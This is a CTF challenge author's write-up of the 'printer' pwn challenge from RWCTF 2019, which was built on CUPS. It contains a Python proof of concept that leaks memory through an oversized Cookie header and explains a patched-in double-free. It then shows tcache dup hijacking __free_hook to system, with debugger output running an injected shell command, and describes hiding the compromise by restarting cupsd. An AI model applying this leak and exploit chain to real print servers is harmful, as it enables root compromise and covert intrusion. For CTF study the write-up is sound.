
I made a challenge named [printer](https://github.com/bash-c/rwctf2019-final-printer/blob/master/description.md) with [@swing](https://twitter.com/bestswngs) for RWCTF 2019 Final. Congratulations to [@ALLES!](https://twitter.com/allesctf) and [@PPP](https://twitter.com/PlaidCTF) who solved it during the game.

> Thanks [@YmCode](https://twitter.com/DuoDuo20989667) and [@leommxj](https://twitter.com/leommxj) for contributing to this challenge

In brief, `printer` is designed upon [cups](https://www.cups.org/), which implements a printing system based on IPP (Internet Printing Protocol). And this challenge could be solved by a memory disclosure issue (rdar://51373853, fixed in [2c030c7a](https://github.com/apple/cups/commit/2c030c7a06e0c2b8227c7e85f5c58dfb339731d0#diff-969d2ab030004bf3ccdd214161658a15)) and a use-after-free vulnerability introduced by my patch.

The leak procedure is quite simple. Here is a sample POC
```python
u64 = lambda x: struct.unpack('<Q', x.encode('latin'))[0]

# leak
leak_header = {"Cookie": 'a' * 20000}
leak = requests.get(url, headers = leak_header)
leaked = leak.headers["Set-cookie"][16372: ]
#  import pdb; pdb.set_trace()

canary = u64(leaked[0x0: 0x08])
print("canary @ {:#x}".format(canary))
heap = u64(leaked[0x8: 0x10]) - 0xc98
print("heap @ {:#x}".format(heap))
libcups = u64(leaked[0x10: 0x18]) - 0x1d6d7
print("libcups @ {:#x}".format(libcups))
stack = u64(leaked[0x38: 0x40])
print("stack @ {:#x}".format(stack))
elf = u64(leaked[0x48: 0x50]) - 0x1d52b
print("elf @ {:#x}".format(elf))
libc = u64(leaked[0x2b0: 0x2b8]) - 0x132169
print("libc @ {:#x}".format(libc)
```

`ALLES!` just totally ignored this issue and got leaked using the UAF vulnerability. Well guys, you dig more code than I do!

And there is a powerful malloc primitive in `cups/ipp.c`
```C
  3594                  if (n > 0)
  3595                  {
  3596                    if ((value->unknown.data = malloc((size_t)n)) == NULL)
  3597                    {
  3598                      _cupsSetHTTPError(HTTP_STATUS_ERROR);
  3599                      DEBUG_puts("1ippReadIO: Unable to allocate value");
  3600                      _cupsBufferRelease((char *)buffer);
  3601                      return (IPP_STATE_ERROR);
  3602                    }
  3603
  3604                    if ((*cb)(src, value->unknown.data, (size_t)n) < n)
  3605                    {
  3606                      DEBUG_puts("1ippReadIO: Unable to read unsupported value.");
  3607                      _cupsBufferRelease((char *)buffer);
  3608                      return (IPP_STATE_ERROR);
  3609                    }
  3610                  }
```

Due to my patch, we can achieve double-free.

First free
```C
pwndbg> bt
#0  ipp_free_values (attr=attr@entry=0x55a7d64869b0, element=element@entry=0, count=1) at ipp.c:6329
#1  0x00007f47eee1fcd4 in ippSetValueTag (ipp=<optimized out>, attr=0x7ffe9a6c9550, value_tag=IPP_TAG_NOVALUE) at ipp.c:4528                <== trigger free
#2  0x00007f47eee2012c in ippReadIO (src=0x55a7d655a010, cb=cb@entry=0x7f47eee1d741 <ipp_read_http>, blocking=0, parent=parent@entry=0x0, ipp=0x55a7d6486960) at ipp.c:3138
#3  0x00007f47eee207e7 in ippRead (http=<optimized out>, ipp=<optimized out>) at ipp.c:2831
#4  0x000055a7d587b135 in cupsdReadClient (con=0x55a7d6558e60) at client.c:1621
#5  0x000055a7d5899d3c in cupsdDoSelect (timeout=<optimized out>) at select.c:480
#6  0x000055a7d587493a in main (argc=argc@entry=4, argv=argv@entry=0x7ffe9a6d6d28) at main.c:845
#7  0x00007f47eea1eb97 in __libc_start_main (main=0x55a7d587377f <main>, argc=4, argv=0x7ffe9a6d6d28, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffe9a6d6d18) at ../csu/libc-start.c:310
#8  0x000055a7d5874eca in _start ()
pwndbg> 
```

Double free
```C
#0  ipp_free_values (attr=attr@entry=0x55a7d64869b0, element=element@entry=0, count=1) at ipp.c:6329
#1  0x00007f47eee1eaa6 in ippDelete (ipp=0x55a7d6486960) at ipp.c:1755
#2  0x000055a7d5879066 in cupsdCloseClient (con=con@entry=0x55a7d6558e60) at client.c:498               <== trigger free
#3  0x000055a7d587b618 in cupsdReadClient (con=0x55a7d6558e60) at client.c:1835
#4  0x000055a7d5899d3c in cupsdDoSelect (timeout=<optimized out>) at select.c:480
#5  0x000055a7d587493a in main (argc=argc@entry=4, argv=argv@entry=0x7ffe9a6d6d28) at main.c:845
#6  0x00007f47eea1eb97 in __libc_start_main (main=0x55a7d587377f <main>, argc=4, argv=0x7ffe9a6d6d28, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffe9a6d6d18) at ../csu/libc-start.c:310
#7  0x000055a7d5874eca in _start ()
```

Combining steps above, we can hijack `__free_hook` to `system` using tcache dup. Luckily, the first object to free is request header which can be fully controlled by attackers. 
```C
pwndbg> c
Continuing.

Breakpoint 1, __libc_system (line=0x5559f19aa1b0 "deflate, gzip, identity; touch /tmp/test ;") at ../sysdeps/posix/system.c:180
180	../sysdeps/posix/system.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────
 RAX  0x7fa177b52440 (system) ◂— test   rdi, rdi
 RBX  0x5559f1a63080 ◂— 9 /* '\t' */
 RCX  0x0
 RDX  0x0
 RDI  0x5559f19aa1b0 ◂— 'deflate, gzip, identity; touch /tmp/test ;'
 RSI  0x7fa177f1e40a (httpClearFields+61) ◂— mov    qword ptr [rbx + r12 + 0x3390], 0
 R8   0x7ffc389c1e48 ◂— 0x6161616161616100
 R9   0x1
 R10  0xffffffff
 R11  0x246
 R12  0x5559f19aa1b0 ◂— 'deflate, gzip, identity; touch /tmp/test ;'
 R13  0x0
 R14  0x1
 R15  0x5559f034c52b (cupsdReadClient+1009) ◂— mov    esi, 0x64
 RBP  0x5559f1a64cb8 ◂— 0x0
 RSP  0x7ffc389c1d98 —▸ 0x7fa177b9ac27 (free+727) ◂— jmp    0x7fa177b9aaa0
 RIP  0x7fa177b52440 (system) ◂— test   rdi, rdi
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
 ► 0x7fa177b52440 <system>          test   rdi, rdi
   0x7fa177b52443 <system+3>        je     system+16 <0x7fa177b52450>
 
   0x7fa177b52445 <system+5>        jmp    do_system <0x7fa177b51eb0>
    ↓
   0x7fa177b51eb0 <do_system>       push   r12
   0x7fa177b51eb2 <do_system+2>     push   rbp
   0x7fa177b51eb3 <do_system+3>     mov    r12, rdi
   0x7fa177b51eb6 <do_system+6>     push   rbx
   0x7fa177b51eb7 <do_system+7>     mov    ecx, 0x10
   0x7fa177b51ebc <do_system+12>    mov    esi, 1
   0x7fa177b51ec1 <do_system+17>    sub    rsp, 0x180
   0x7fa177b51ec8 <do_system+24>    lea    rbx, [rsp + 0xe0]
──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ rsp  0x7ffc389c1d98 —▸ 0x7fa177b9ac27 (free+727) ◂— jmp    0x7fa177b9aaa0
01:0008│      0x7ffc389c1da0 —▸ 0x7ffc389c2748 ◂— 0x0
02:0010│      0x7ffc389c1da8 —▸ 0x5559f1a63080 ◂— 9 /* '\t' */
03:0018│      0x7ffc389c1db0 —▸ 0x7ffc389c1de8 ◂— 0xd8
04:0020│      0x7ffc389c1db8 —▸ 0x5559f1a63080 ◂— 9 /* '\t' */
05:0028│      0x7ffc389c1dc0 ◂— 0x15a
06:0030│      0x7ffc389c1dc8 ◂— 0xb4aa529aeef52500
07:0038│      0x7ffc389c1dd0 ◂— 0x0
────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
 ► f 0     7fa177b52440 system
   f 1     7fa177b9ac27 free+727
   f 2     7fa177f1e40a httpClearFields+61
   f 3     5559f034b62e cupsdSendError+120
   f 4     5559f034d16b cupsdReadClient+4145
   f 5     5559f036bd3c cupsdDoSelect+186
   f 6     5559f034693a main+4539
   f 7     7fa177b24b97 __libc_start_main+231
─────────────────────────────────────────────────────────────────────────────────────────────────────
Breakpoint *system
pwndbg> bt
#0  __libc_system (line=0x5559f19aa1b0 "deflate, gzip, identity; touch /tmp/test ;") at ../sysdeps/posix/system.c:180
#1  0x00007fa177b9ac27 in __GI___libc_free (mem=0x5559f19aa1b0) at malloc.c:3094
#2  0x00007fa177f1e40a in httpClearFields (http=0x5559f1a63080) at http.c:303
#3  0x00005559f034b62e in cupsdSendError (con=con@entry=0x5559f1a61ed0, code=HTTP_STATUS_BAD_REQUEST, auth_type=0) at client.c:1952
#4  0x00005559f034d16b in cupsdReadClient (con=0x5559f1a61ed0) at client.c:1626
#5  0x00005559f036bd3c in cupsdDoSelect (timeout=<optimized out>) at select.c:480
#6  0x00005559f034693a in main (argc=argc@entry=4, argv=argv@entry=0x7ffc389d0b18) at main.c:845
#7  0x00007fa177b24b97 in __libc_start_main (main=0x5559f034577f <main>, argc=4, argv=0x7ffc389d0b18, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffc389d0b08) at ../csu/libc-start.c:310
#8  0x00005559f0346eca in _start ()
```

You can read my full exploit [here](https://github.com/bash-c/rwctf2019-final-printer/blob/master/solve.py)

Since printed file is cached in `/var/spool/cups` , we can achieve the first two steps (spawn a calculator and read printed file) now. 

```
                       ^\    ^
                      / \\  / \
                     /.  \\/   \      |\___/|
  *----*           / / |  \\    \  __/  O  O\
  |   /          /  /  |   \\    \_\/  \     \
 / /\/         /   /   |    \\   _\/    '@___@
/  /         /    /    |     \\ _\/       |U
|  |       /     /     |      \\\/        |
\  |     /_     /      |       \\  )   \ _|_
\   \       ~-./_ _    |    .- ; (  \_ _ _,\'
~    ~.           .-~-.|.-*      _        {-,
 \      ~-. _ .-~                 \      /\'
  \                   }            {   .*
   ~.                 '-/        /.-~----.
     ~- _             /        >..----.\\\
         ~ - - - - ^}_ _ _ _ _ _ _.-\\\
```



As for the third step,

> 3. print this message `hacked by {your_team_name}`

I designed this step to bring this challenge more real. Imagine you have hacked into some printer, the first thing to do is to make the victim be unknown, that's to say, to make sure the printer works well and can print things normally.

Since we got a root shell by pwnning the binary `cupsd`, print-related command like `echo "hacked by RWCTF" | /usr/bin/lpr` will be hung to our shell.  Simply restart the `cupsd` binary could solve our problem.